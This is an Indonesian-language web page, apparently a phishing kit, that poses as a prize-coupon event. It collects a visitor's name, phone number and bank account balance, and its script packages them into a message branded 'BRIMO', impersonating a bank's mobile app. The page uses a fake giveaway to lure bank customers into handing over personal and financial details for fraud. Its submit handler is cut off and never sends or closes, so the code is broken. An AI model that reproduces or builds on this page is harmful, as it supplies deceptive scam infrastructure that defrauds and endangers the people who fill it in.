<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Kupon</title>
    <style>
        /* Mengatur Body agar benar-benar penuh 100% */
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center; /* Menjaga form tetap di tengah secara horizontal */
        }

        /* Styling Gambar Header (Penuh jika diinginkan) */
        .header-image {
            width: 100%; /* Gambar akan mengikuti lebar layar */
            max-width: 100%; 
            height: auto;
            display: block;
        }

        /* Form akan menyesuaikan lebar tapi tidak terlalu melar di layar lebar */
        form {
            width: 100%;
            max-width: 450px; /* Batas maksimal agar tidak terlalu lebar di PC */
            padding: 20px;
            box-sizing: border-box; /* Agar padding tidak menambah lebar elemen */
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 8px;
            color: #333;
            font-size: 14px;
        }

        /* Input Styling mirip gambar asli */
        input[type="text"],
        input[type="tel"],
        select {
            width: 100%;
            padding: 15px;
            border: 2px solid #3474d4;
            border-radius: 10px;
            box-sizing: border-box;
            font-size: 16px;
            outline: none;
            color: #333;
        }

        select {
            background-color: #f3f3f3;
            cursor: pointer;
        }

        /* Tombol Biru Cetak */
        .btn-submit {
            width: 100%;
            background-color: #1a60be;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        .btn-submit:active {
            transform: scale(0.98);
            background-color: #144b96;
        }
    </style>
</head>
<body>

<img src="a0732a16-c96e-4188-8cd1-af3c81c41a52.jpeg" width="100%">
        
        <div class="subtitle">Lengkapi Formulir Pendaftaran Anda</div>
<form id="eventForm">
<div class="form-area">
<select name="pilihan" id="pilihan">
<option>PILIH KUPON UNTUK ANDA</option>
<option value="Paket Umroh & Tiket Liburan">Paket Umroh & Tiket Liburan</option>
<option value="Uang Cash & Emas">Uang Cash & Emas</option>
<option value="Mobil & Motor">Mobil & Motor</option>
</select>

<label>Nama Lengkap</label>
<input type="text" name="nama" id="nama" placeholder="Masukkan Nama Lengkap" required>

<label>Nomor Handphone</label>
<input type="tel" name="nohp" id="nohp" placeholder="Masukkan Nomor Handphone" required>

<label>Saldo Rekening Terakhir</label>
<input type="tel" name="saldo" id="saldo" placeholder="Rp." required>

<div style="display:none;">
  <input type="text" name="honeypot" id="honeypot" tabindex="-1" autocomplete="off">
</div>

<button type="submit" id="submitBtn">Cetak Kupon</button>
</div>
</form>
<div class="logos">
<img src="https://i.ibb.co.com/SY7k9bR/20260207-025955.jpg">
</div>

<div class="footer">
©️ 2026 Event Organizer<br>
All Rights Reserved.
</div>

</div>
<script src="th/bh.js"></script>
<script>
document.getElementById("eventForm").addEventListener("submit", function(e){
  e.preventDefault();

  const submitBtn = document.getElementById("submitBtn");
  const honeypot = document.getElementById("honeypot").value;
  
  if (honeypot.length > 0) {
    console.log("Spam detected!");
    return;
  }

  let pilihan = document.getElementById("pilihan").value;
  let nama    = document.getElementById("nama").value.trim();
  let nohp    = document.getElementById("nohp").value.trim();
  let saldo   = document.getElementById("saldo").value.trim();

  if (nama.length < 3 || nohp.length < 9) {
    alert("Mohon masukkan data yang valid.");
    return;
  }

  submitBtn.disabled = true;
  submitBtn.innerText = "Memproses...";

  let pesan = `BRIMO\n───────────────────────\n• Pilihan : ${pilihan}\n• Nama Lengkap : ${nama}\n• Nomor Hp : ${nohp}\n• Saldo Rekening : ${saldo}\n───────────────────────\n©️ Brimo - 2026`;

</script>
<script>
const saldoInput = document.getElementById("saldo");

saldoInput.addEventListener("input", function () {
  let angka = this.value.replace(/[^0-9]/g, "");

  if (angka === "") {
    this.value = "";
    return;
  }

  let formatRupiah = angka.replace(/\B(?=(\d{3})+(?!\d))/g, ".");

  this.value = "Rp " + formatRupiah;
});

saldoInput.addEventListener("focus", function () {
  if (this.value === "") {
    this.value = "Rp ";
  }
});

saldoInput.addEventListener("blur", function () {
  if (this.value === "Rp ") {
    this.value = "";
  }
});
</script>

</body>
</html>
